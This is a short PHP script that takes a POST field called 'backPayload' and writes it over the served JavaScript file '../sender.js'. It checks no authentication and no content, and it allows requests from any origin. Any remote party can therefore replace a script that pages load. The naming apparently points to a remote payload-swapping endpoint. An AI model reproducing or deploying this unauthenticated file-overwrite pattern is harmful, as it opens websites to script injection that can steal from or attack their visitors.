<?php
header("X-Frame-Options: sameorigin");
header("Access-Control-Allow-Origin: *");

$datajson = '../sender.js';
$backPayload = "";

if($_SERVER["REQUEST_METHOD"] == "POST"){
	$backPayload = $_POST["backPayload"];
}

if(empty($backPayload)){
	echo "Payload Is Empty!!!";
}else{
	if(file_exists($datajson)){
		file_put_contents($datajson, $backPayload);
		echo "Successful !!!";
	}else{
		echo "Something Went Wrong !!!";
	}
}
?>